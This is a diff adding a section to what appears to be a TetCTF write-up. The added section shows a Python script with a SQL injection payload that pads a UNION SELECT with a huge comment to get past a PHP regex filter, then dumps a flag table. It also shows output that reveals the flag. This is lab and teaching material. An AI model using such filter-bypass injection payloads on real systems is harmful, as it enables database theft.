@@ -257,3 +257,32 @@ Security Check!!! Please enter your ID to prove who are you !!!:
 Hello 2
 ```
 
+Now we can print flag without knowing column_name (That's the beauty if we have Union)
+
+```css
+def union_bypass():
+	#payload = 'union/*'+'a'*1000000+'*/select 1,2,3-- -'
+	payload='union/*'+'a'*1000000+'*/select 1,(select b from (select 1 as a, 2 as b union/*'+'a'*1000000+'*/select * from Th1z_Fack1n_Fl4444g_Tabl3) bbb limit 1,1),3-- -'
+	r = requests.post(url,headers={'Content-Type':'application/x-www-form-urlencoded'},data={'id':'-2 {}'.format(payload)},proxies={'http':'http://127.0.0.1:8080'})
+	print r.text
+```
+
+Outcome is 
+
+```css
+root@MrR3boot:~# python do.py 
+1. Dump Database Name
+2. Find Table Names
+3. Union Bypass (PHP & RegEx Bug)
+> 3
+
+<br><br><br><br><center>
+Security Check!!! Please enter your ID to prove who are you !!!:
+<form action="index.php" method="POST">
+        <input name="id" value="" /><br>
+        <input type="submit" value="Submit" />
+</form>
+</center>
+
+Hello TetCTF{0wl_d0nkey_means_Liarrrrrrr}
+```
